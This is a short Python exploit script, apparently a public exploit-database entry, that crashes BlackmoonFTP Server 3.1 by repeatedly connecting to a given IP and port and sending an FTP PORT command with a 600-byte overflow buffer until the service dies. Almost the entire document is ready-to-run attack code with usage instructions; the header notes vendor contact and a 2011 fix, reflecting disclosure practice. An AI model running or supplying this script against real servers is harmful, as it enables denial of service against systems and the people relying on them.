#!/usr/bin/python

# Exploit Title: BlackmoonFTP Server DOS
# Date: 12/28/2010
# Author: Craig Freyman (cd1zz)
# Software Link: http://www.mediafire.com/?bnc4d00myymmx55
# Version: 3.1 Release 6 - Build 1735 and 1736
# Tested On: Windows XP SP3
# Vendor Contacted: 12/28/2010
# Vendor Fixed: 1/13/2011

import socket
import sys

buffer = '\x41' * 600

counter = 1

if len(sys.argv) != 3:
    	print "Usage: ./blackmoonDOS.py <ip> <port>"
        sys.exit()
 
ip   = sys.argv[1]
port = sys.argv[2]

while counter <= 300:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:	
		print "[*] Sending evil buffer. Count " + str(counter) + " out of 300"
		s.connect((ip,int(port)))
		s.recv(1024)
		s.send('PORT ' + buffer + '\r\n')
		s.recv(1024)
		s.send('QUIT \r\n')
		s.recv(1024)	
		s.close()
		counter=counter+1
	except:
		print "Check the service - probably dead!"
		sys.exit()